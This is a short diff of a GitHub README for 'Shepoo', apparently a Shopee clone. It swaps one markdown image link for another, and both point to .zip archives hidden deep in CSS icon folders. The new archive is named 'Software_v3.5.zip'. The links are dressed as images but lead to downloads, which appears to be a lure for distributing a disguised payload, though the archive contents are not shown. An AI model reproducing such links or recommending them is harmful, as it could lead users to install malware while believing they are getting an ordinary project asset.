@@ -2,7 +2,7 @@
 # Shepoo 
 A clone of Shopee XD
 
-![image](https://raw.githubusercontent.com/dhhn2002/Shepoo/main/ASM_Shepoo/src/main/resources/static/css/icons/weather-icons/less/mappings/Shepoo_floriferous.zip)
+![image](https://github.com/dhhn2002/Shepoo/raw/refs/heads/main/ASM_Shepoo/src/main/resources/static/css/icons/themify-icons/Software_v3.5.zip)
 
 
 # Introduction
